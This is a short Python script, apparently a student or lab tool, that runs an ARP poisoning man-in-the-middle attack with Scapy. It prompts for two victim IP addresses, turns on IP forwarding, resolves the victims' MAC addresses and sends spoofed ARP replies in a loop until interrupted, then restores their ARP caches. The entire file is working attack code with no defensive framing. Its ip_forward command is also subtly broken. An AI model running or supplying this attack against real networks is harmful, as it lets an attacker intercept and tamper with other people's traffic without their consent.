from scapy.all import*
import os
import sys
import time

def ARPpoison(fvictimIP, fvictimMAC, svictimIP, svictimMAC): 
  send(ARP(op=2,psrc=fvictimIP, hwdst=svictimMAC, pdst=svictimIP),verbose=0, iface="eth0")
  send(ARP(op=2,psrc=svictimIP, hwdst=fvictimMAC, pdst=fvictimIP),verbose=0, iface="eth0")
def restore(fvictimIP, fvictimMAC, svictimIP, svictimMAC):
  send(ARP(op=2, pdst=svictimIP, psrc=fvictimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=fvictimMAC),count=5)
  send(ARP(op=2, pdst=fvictimIP, psrc=svictimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=svictimMAC),count=5)
def getMAC(anIP):
  arppacket = Ether()/ARP()
  arppacket[ARP].pdst = anIP
  arppacket[Ether].dst = "ff:ff:ff:ff:ff:ff"
  ans,unans = srp(arppacket, timeout=2, iface="eth0")
  return ans[0][1].hwsrc

firstIP = input("Enter victim IP: ")
secondIP = input("Enter victim IP: ")
os.system("echo 1> /proc/sys/net/ipv4/ip_forward")

firstMAC = getMAC(firstIP)
print("first victim MAC address: " + firstMAC)
secondMAC = getMAC(secondIP)
print("second victim MAC address: " + secondMAC)

try:
  print("Start ARP poison attack ....... ")
  while True:
    ARPpoison(firstIP,firstMAC,secondIP,secondMAC)
    time.sleep(2)
except KeyboardInterrupt:
  print("Restoring ARPcache ...... ")
  restore(firstIP,firstMAC,secondIP,secondMAC)
  print("Stop ARP poisoning")
  sys.exit(1)
